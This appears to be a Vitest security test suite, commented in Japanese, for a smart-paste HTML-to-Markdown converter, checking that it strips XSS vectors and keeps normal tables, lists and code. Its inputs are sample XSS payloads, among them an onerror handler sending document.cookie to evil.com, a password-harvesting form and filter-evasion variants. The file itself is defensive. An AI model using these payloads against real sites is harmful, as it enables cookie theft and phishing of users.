/**
 * smart-paste セキュリティテスト
 *
 * htmlToMarkdown が各種 XSS / インジェクション攻撃を除去し、
 * 正当なコンテンツのみを Markdown 文字列として返すことを検証する。
 *
 * 検証するシナリオ:
 * - javascript: / vbscript: / data:text/html プロトコル
 * - 禁止タグ (iframe / form / object / embed / script)
 * - イベントハンドラ属性 (onclick / onerror / onload 等)
 * - SVG 内 XSS
 * - ペーストサイズ制限 (MAX_PASTE_HTML_BYTES)
 * - data URI 画像サイズ制限 (MAX_DATA_URI_BYTES)
 * - ポリモーフィック攻撃（大文字・小文字混在 / ヌルバイト）
 */

import { describe, it, expect } from 'vitest';
import { htmlToMarkdown } from './smart-paste';
import { MAX_PASTE_HTML_BYTES, MAX_DATA_URI_BYTES } from '../../utils/dompurify-config';

describe('htmlToMarkdown – security', () => {
  // ---------------------------------------------------------------------------
  // 危険なプロトコルの除去
  // ---------------------------------------------------------------------------
  describe('dangerous protocol sanitization', () => {
    it('javascript: href はリンクの出力先に含まれない', () => {
      const html = '<a href="javascript:alert(document.cookie)">click me</a>';
      const result = htmlToMarkdown(html);
      expect(result).not.toContain('javascript:');
    });

    it('vbscript: href はリンクの出力先に含まれない', () => {
      const html = '<a href="vbscript:msgbox(1)">click</a>';
      const result = htmlToMarkdown(html);
      expect(result).not.toContain('vbscript:');
    });

    it('data:text/html href はリンクの出力先に含まれない', () => {
      const html = '<a href="data:text/html,<script>alert(1)</script>">payload</a>';
      const result = htmlToMarkdown(html);
      expect(result).not.toContain('data:text/html');
    });

    it('https:// リンクは正常に変換される', () => {
      const html = '<a href="https://example.com">Example</a>';
      const result = htmlToMarkdown(html);
      expect(result).toContain('https://example.com');
    });
  });

  // ---------------------------------------------------------------------------
  // 禁止タグの除去
  // ---------------------------------------------------------------------------
  describe('forbidden tag removal', () => {
    it('<iframe> タグを除去する', () => {
      const html = '<p>text</p><iframe src="https://evil.com" width="0" height="0"></iframe>';
      const result = htmlToMarkdown(html);
      expect(result).not.toContain('iframe');
      expect(result).toContain('text');
    });

    it('<script> タグとその内容を除去する', () => {
      const html = '<p>safe</p><script>document.location="https://phish.com"</script>';
      const result = htmlToMarkdown(html);
      expect(result).not.toContain('script');
      expect(result).not.toContain('document.location');
    });

    it('<form> タグと内部要素を除去する', () => {
      const html =
        '<form action="https://phish.com/steal" method="POST">' +
        '<input name="password"><button>Submit</button></form>';
      const result = htmlToMarkdown(html);
      expect(result).not.toContain('<form');
      expect(result).not.toContain('<input');
    });

    it('<object> タグを除去する', () => {
      const html =
        '<p>before</p><object data="exploit.swf" type="application/x-shockwave-flash"></object><p>after</p>';
      const result = htmlToMarkdown(html);
      expect(result).not.toContain('object');
      expect(result).toContain('before');
      expect(result).toContain('after');
    });

    it('<embed> タグを除去する', () => {
      const html = '<embed src="exploit.swf" type="application/x-shockwave-flash"><p>text</p>';
      const result = htmlToMarkdown(html);
      expect(result).not.toContain('embed');
    });

    it('<style> タグを除去する', () => {
      const html =
        '<style>body{background:url("javascript:alert(1)")}</style><p>content</p>';
      const result = htmlToMarkdown(html);
      expect(result).not.toContain('<style');
      expect(result).not.toContain('background');
    });
  });

  // ---------------------------------------------------------------------------
  // イベントハンドラ属性の除去
  // ---------------------------------------------------------------------------
  describe('event handler attribute removal', () => {
    it('onerror 属性を除去する', () => {
      const html = '<img src="x" onerror="fetch(\'https://evil.com/?\'+document.cookie)">';
      const result = htmlToMarkdown(html);
      expect(result).not.toContain('onerror');
      expect(result).not.toContain('document.cookie');
    });

    it('onclick 属性を除去しテキストは保持する', () => {
      const html = '<span onclick="steal(document.cookie)">visible text</span>';
      const result = htmlToMarkdown(html);
      expect(result).not.toContain('onclick');
      expect(result).not.toContain('steal');
      expect(result).toContain('visible text');
    });

    it('onmouseover 属性を除去する', () => {
      const html = '<a href="https://example.com" onmouseover="track(this)">link</a>';
      const result = htmlToMarkdown(html);
      expect(result).not.toContain('onmouseover');
      expect(result).not.toContain('track');
    });

    it('onload 属性を除去する', () => {
      const html = '<img src="valid.jpg" onload="exfil()" alt="img">';
      const result = htmlToMarkdown(html);
      expect(result).not.toContain('onload');
      expect(result).not.toContain('exfil');
    });

    it('onfocus 属性を除去する', () => {
      const html = '<input type="text" value="x" onfocus="steal(this.value)">';
      const result = htmlToMarkdown(html);
      expect(result).not.toContain('onfocus');
    });
  });

  // ---------------------------------------------------------------------------
  // SVG 内 XSS
  // ---------------------------------------------------------------------------
  describe('SVG XSS vectors', () => {
    it('SVG 内の script タグを除去する', () => {
      const html = '<svg><script>alert(1)</script><rect width="100" height="100"/></svg>';
      const result = htmlToMarkdown(html);
      expect(result).not.toContain('alert(1)');
      expect(result).not.toContain('<script');
    });

    it('SVG 要素の onclick ハンドラを除去する', () => {
      const html = '<svg><circle onclick="alert(1)" cx="50" cy="50" r="50"/></svg>';
      const result = htmlToMarkdown(html);
      expect(result).not.toContain('onclick');
    });

    it('SVG の animate タグ内の XSS を除去する', () => {
      const html =
        '<svg><a href="javascript:alert(1)"><text>click</text></a></svg>';
      const result = htmlToMarkdown(html);
      expect(result).not.toContain('javascript:');
    });
  });

  // ---------------------------------------------------------------------------
  // META タグ / リダイレクト
  // ---------------------------------------------------------------------------
  describe('meta refresh / redirect', () => {
    it('<meta http-equiv="refresh"> を除去する', () => {
      const html =
        '<meta http-equiv="refresh" content="0;url=https://phish.com"><p>content</p>';
      const result = htmlToMarkdown(html);
      expect(result).not.toContain('http-equiv');
      expect(result).not.toContain('refresh');
    });
  });

  // ---------------------------------------------------------------------------
  // ペーストサイズ制限
  // ---------------------------------------------------------------------------
  describe('paste size limits', () => {
    it('MAX_PASTE_HTML_BYTES を超える HTML はタグを除去してテキストを返す', () => {
      // 5MB を超えるペーストを再現
      const padding = 'A'.repeat(MAX_PASTE_HTML_BYTES + 1);
      const largeHtml = `<p>${padding}</p>`;
      const result = htmlToMarkdown(largeHtml);
      // タグが除去されていること
      expect(result).not.toContain('<p>');
      // 100,000 文字に切り詰められていること
      expect(result.length).toBeLessThanOrEqual(100_000);
    });

    it('MAX_PASTE_HTML_BYTES 以下の HTML は通常変換される', () => {
      const normalHtml = '<p>Hello <strong>World</strong></p>';
      const result = htmlToMarkdown(normalHtml);
      expect(result).toContain('Hello');
      expect(result).toContain('**World**');
    });

    it('MAX_DATA_URI_BYTES を超える data:image URI は空の src に置き換えられる', () => {
      // 10MB を超える base64 文字列を生成（imgDataUri カスタムルールのテスト）
      const largeBase64 = 'A'.repeat(MAX_DATA_URI_BYTES + 1);
      const html = `<img src="data:image/png;base64,${largeBase64}" alt="huge">`;
      const result = htmlToMarkdown(html);
      // DOMPurify が大きな data URI を保持しても imgDataUri ルールで空になる
      expect(result).not.toContain(largeBase64);
    });
  });

  // ---------------------------------------------------------------------------
  // ポリモーフィック攻撃
  // ---------------------------------------------------------------------------
  describe('polymorphic attack vectors', () => {
    it('大文字・小文字混在の ScRiPt タグを除去する', () => {
      const html = '<p>text</p><ScRiPt>alert(1)</ScRiPt>';
      const result = htmlToMarkdown(html);
      expect(result).not.toContain('alert(1)');
    });

    it('ヌルバイトを含む javascript: プロトコルを除去する', () => {
      const html = '<img src="jav\0ascript:alert(1)" alt="img">';
      const result = htmlToMarkdown(html);
      expect(result).not.toContain('javascript:');
    });

    it('HTML エンティティとして記述された script タグはプレーンテキストとして保持される', () => {
      // &lt;script&gt; は DOMPurify がテキストノードとして扱う（実際の script 要素ではない）
      // Turndown はこのテキストを Markdown にそのまま変換するため、
      // Markdown 出力に "<script>" という文字列が含まれることは意図した動作。
      // このテキストは TipTap / remark で再レンダリングする際に
      // allowDangerousHtml:false によって安全に処理される。
      const html = '<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>';
      const result = htmlToMarkdown(html);
      // テキストとして保持されること（実行可能な <script> 要素ではない）
      expect(result).toContain('alert(1)');
      // Markdown ファイルとして保存され再度レンダリングされた際、
      // remark の allowDangerousHtml:false がこれを raw HTML として無視する
    });

    it('スペース区切りで記述されたプロトコルを除去する', () => {
      // "java script:" のような変形パターン（DOMPurify が正規化して除去）
      const html = '<a href="java script:alert(1)">click</a>';
      const result = htmlToMarkdown(html);
      // href が付与されていないか、または javascript が含まれないこと
      expect(result).not.toMatch(/java\s*script:/i);
    });
  });

  // ---------------------------------------------------------------------------
  // 正常なコンテンツが正しく変換されること（回帰テスト）
  // ---------------------------------------------------------------------------
  describe('normal content regression', () => {
    it('テーブルを正しく変換する', () => {
      const html =
        '<table><thead><tr><th>Name</th><th>Value</th></tr></thead>' +
        '<tbody><tr><td>foo</td><td>bar</td></tr></tbody></table>';
      const result = htmlToMarkdown(html);
      expect(result).toContain('| Name | Value |');
      expect(result).toContain('| foo | bar |');
    });

    it('コードブロックを正しく変換する', () => {
      const html = '<pre><code>const x = 1;\nconst y = 2;</code></pre>';
      const result = htmlToMarkdown(html);
      expect(result).toContain('```');
      expect(result).toContain('const x = 1;');
    });

    it('ネストリストを正しく変換する', () => {
      const html = '<ul><li>A<ul><li>B</li></ul></li><li>C</li></ul>';
      const result = htmlToMarkdown(html);
      expect(result).toContain('A');
      expect(result).toContain('B');
      expect(result).toContain('C');
    });

    it('空文字列を処理できる', () => {
      expect(htmlToMarkdown('')).toBe('');
    });
  });
});
